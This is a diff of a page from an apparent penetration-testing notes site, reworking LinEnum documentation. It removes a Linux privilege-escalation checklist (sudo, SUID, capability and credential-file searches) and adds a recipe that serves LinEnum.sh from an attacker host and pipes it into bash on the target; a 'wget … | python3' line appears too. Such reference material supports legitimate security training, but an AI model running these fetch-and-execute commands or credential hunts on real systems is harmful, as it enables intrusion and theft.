@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/linenum.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=linenum) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Run a basic Linux enumeration report
+## Run a basic Linux enumeration report
 
 **Run in:** Linux target. **Requires:** The intended LinEnum script already available locally and Bash support; optional deeper scans have different scope/cost.
 
@@ -21,117 +27,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 bash ./LinEnum.sh
 ```
 
-**Read the result:** Use the report to shortlist local permissions, services, scheduled tasks and credentials worth checking manually.
-
-**If The report lacks a service or privilege detail:** Missing commands or restricted file access reduce coverage; an empty section is not a guarantee of a secure configuration.
+**What the result establishes:** Use the report to shortlist local permissions, services, scheduled tasks and credentials worth checking manually.
 
 **Next check:** Use a direct query for the missing evidence, then verify permissions and the privileged process that would consume the candidate object.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/rebootuser/LinEnum)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Enumerate from identity to privileged execution
-
-After obtaining a Linux shell, build a short list of facts before selecting an escalation technique: user/groups, OS/architecture, allowed sudo commands, interesting services, writable files used by privileged processes, and reusable credentials. Automation helps collect leads; each lead still needs a manually verified condition.
-
-### Establish the baseline
-
-```bash
-id
-hostname
-uname -a
-cat /etc/os-release
-pwd
-printf '%s\n' "$PATH"
-sudo -l
-```
-
-Keep the complete sudo rule, including run-as user, argument restrictions and environment handling. A rule for one binary is not unrestricted root access. Kernel versions also need distribution/patch context before researching an exploit.
-
-### Identify processes, listeners and scheduled work
-
-```bash
-ps auxww
-ss -lntup
-systemctl list-timers --all
-cat /etc/crontab
-ls -la /etc/cron.d /etc/cron.daily
-crontab -l
-```
-
-A root process or cron entry becomes interesting when you can control an executable, script, configuration file, searched path or input it consumes. Check the entire path's permissions and whether the job actually executes. Services bound to loopback may expose useful internal applications through a forward.
-
-### Inspect special permissions and writable paths
-
-```bash
-find / -type f -perm -4000 -ls 2>/dev/null
-find / -type f -perm -2000 -ls 2>/dev/null
-getcap -r / 2>/dev/null
-find /etc /opt /usr/local /var/www -writable -ls 2>/dev/null
-ls -ld /PATH /PATH/TO /PATH/TO/FILE
-```
-
-Some searches are incomplete without privilege; suppressed errors keep output readable but do not prove full coverage. SUID, SGID and capabilities change execution privileges differently. Evaluate the program's actual behavior and mount restrictions rather than assuming every match is exploitable.
-
-### Hunt credentials where applications use them
-
-```bash
-find /var/www /opt /home -type f \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*config*' \) 2>/dev/null
-ls -la ~/.ssh
-ls -la /var/backups
-```
-
-Inspect selected files with their surrounding context. Keep database credentials, service-account credentials, SSH keys and application tokens distinct. Verify one relevant service/account before trying reuse elsewhere. Do not equate a readable backup with current credentials.
-
-### Use collection output as a queue
-
-Run LinEnum/LinPEAS/LSE only from a known file whose purpose and options you have checked. Save the report, select one promising finding, and reproduce the underlying check manually. Examples: verify a writable unit's exact path, inspect a sudo rule with its arguments, or observe a privileged scheduled command with pspy.
-
-| Evidence | Next check |
-| --- | --- |
-| Interesting sudo rule | Allowed arguments, run-as context and documented program behavior |
-| Writable privileged script | Parent directories, actual execution and current owner |
-| Capability on a binary | Specific capability bits and how that binary uses them |
-| Local-only service | Application protocol, authentication and possible forwarding |
-| Credential in configuration | Account purpose, freshness and smallest relevant validation |
-| Kernel version lead | Distribution patch state, exact prerequisites and safer configuration paths first |
-
-Record why a candidate failed. A negative result on one binary or service is useful evidence, not a reason to rerun the same broad script without a new hypothesis.
-
-## LinEnum.sh: choose the operation and read the result
-
-Commands and examples collected from your LinEnum.sh notes.
-
-### What the result establishes
-
-Use the report to shortlist local permissions, services, scheduled tasks and credentials worth checking manually.
-
-### Prerequisites and common failures
-
-Missing commands or restricted file access reduce coverage; an empty section is not a guarantee of a secure configuration.
-
-### Example 1: Tools
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```powershell
-./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your LinEnum.sh notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=linenum) · [All tools](/index)
 
 ## Tools
 
@@ -141,20 +39,17 @@ Commands and examples collected from your LinEnum.sh notes.
 ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Linux Privilege Escalation: Full Checklist — Tools](/privesc/linux-privesc-checklist#tools)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The report lacks a service or privilege detail | Missing commands or restricted file access reduce coverage; an empty section is not a guarantee of a secure configuration. |
 
 ## Notebook recipes
 
-2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+3 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -195,7 +90,30 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 5: wget and cURL](/enumeration/citrix-netscaler#example-5-wget-and-curl) · [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+**Original note sections:** [File Transfers for Linux and Windows — wget and cURL](/post-exploitation/file-transfers-cheat-sheet#wget-and-curl)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Automated Linux local enumeration script">
+
+### Automated Linux local enumeration script
+
+**LinEnum: Script Bookmark**
+
+```bash
+# On Kali: host LinEnum.sh
+python3 -m http.server 8000
+
+# On target: run in memory or from /tmp and save output
+curl -s http://LHOST:8000/LinEnum.sh | bash -s -- -t > /tmp/linenum.txt
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LinEnum: Script Bookmark — Automated Linux local enumeration script](/enumeration/linenum#automated-linux-local-enumeration-script)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -203,6 +121,10 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 </Accordion>
 
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://github.com/rebootuser/LinEnum)
 
 {/* VAULT_RELATED_START */}
 
@@ -212,5 +134,3 @@ wget -qO- http://<IP>/helloworld.py | python3           # -q = quiet, -O- = outp
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
